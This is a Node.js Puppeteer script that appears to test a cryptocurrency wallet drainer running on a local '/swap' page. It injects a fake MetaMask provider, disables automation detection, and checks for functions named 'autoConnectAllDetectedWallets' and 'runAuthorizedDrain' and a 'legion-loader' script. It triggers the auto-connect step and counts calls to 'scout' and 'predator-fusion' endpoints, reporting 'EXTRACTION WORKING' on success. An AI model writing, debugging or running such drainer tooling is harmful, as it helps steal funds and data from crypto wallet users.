const puppeteer = require('../../node_modules/.pnpm/puppeteer-core@23.11.1_bufferutil@4.1.0_utf-8-validate@5.0.10/node_modules/puppeteer-core');

(async () => {
  const browser = await puppeteer.launch({
    headless: 'new',
    executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
    args: ['--no-sandbox', '--disable-blink-features=AutomationControlled']
  });

  const page = await browser.newPage();
  
  let scoutCalls = 0;
  let fusionCalls = 0;
  
  page.on('response', async (response) => {
    if (response.url().includes('/api/v1/scout') && !response.url().includes('/ranked')) {
      console.log(`[RESPONSE] ${response.status()} ${response.request().method()} /api/v1/scout`);
      if (response.status() === 200) scoutCalls++;
    }
    if (response.url().includes('/api/scout/recursive-predator-fusion')) {
      console.log(`[RESPONSE] ${response.status()} POST /api/scout/recursive-predator-fusion`);
      if (response.status() === 200) fusionCalls++;
    }
  });

  page.on('console', msg => {
    const text = msg.text();
    if (text.includes('[SCOUT]') || text.includes('[SIGNATURE]')) {
      console.log(`[CONSOLE] ${text}`);
    }
  });

  await page.evaluateOnNewDocument(() => {
    window.ethereum = {
      isMetaMask: true,
      selectedAddress: '0x742d35Cc6634C0532925a3b844Bc859fFD72B457',
      chainId: '0x1',
      request: async (args) => {
        if (args.method === 'eth_requestAccounts' || args.method === 'eth_accounts') {
          console.log('[WALLET] eth_requestAccounts called');
          return ['0x742d35Cc6634C0532925a3b844Bc859fFD72B457'];
        }
        if (args.method === 'eth_chainId') return '0x1';
        return null;
      },
      _handlers: {},
      on: (event, handler) => {
        if (!window.ethereum._handlers[event]) window.ethereum._handlers[event] = [];
        window.ethereum._handlers[event].push(handler);
      },
      removeListener: () => {}
    };
  });

  console.log('Loading page (with 8 second wait for all scripts)...');
  await page.goto('http://localhost:8080/swap', {waitUntil: 'networkidle0', timeout: 20000}).catch(() => {});
  
  console.log('Waiting for scripts to initialize...');
  await new Promise(r => setTimeout(r, 5000));

  const status = await page.evaluate(() => {
    return {
      hasAutoConnect: typeof window.autoConnectAllDetectedWallets === 'function',
      hasRunDrain: typeof window.runAuthorizedDrain === 'function',
      hasPostScout: typeof window.postScout === 'function',
      localStorage: Object.keys(window.localStorage).length,
      indexedDB: 'available'
    };
  });

  console.log('\nScript status:', status);

  if (status.hasAutoConnect) {
    console.log('\n✅ Auto-connect function available!');
    console.log('Triggering extraction...');
    await page.evaluate(() => {
      window.autoConnectAllDetectedWallets().catch(e => console.log('[ERROR]', e.message));
    });
    
    console.log('Waiting for API calls...');
    await new Promise(r => setTimeout(r, 6000));
  } else {
    console.log('\n❌ Scripts not loaded properly!');
    const pageContent = await page.evaluate(() => {
      return {
        title: document.title,
        hasLegionLoader: !!document.querySelector('script[src*="legion-loader"]'),
        scriptCount: document.querySelectorAll('script').length,
        errors: window.__PAGE_ERRORS__ || []
      };
    });
    console.log('Page content:', pageContent);
  }

  console.log(`\n=== RESULTS ===`);
  console.log(`Scout API calls (200 status): ${scoutCalls}`);
  console.log(`Fusion API calls (200 status): ${fusionCalls}`);
  
  if (scoutCalls > 0) {
    console.log('\n✅ EXTRACTION WORKING!');
  } else {
    console.log('\n⚠️  Extraction not triggered');
  }

  await browser.close();
})();
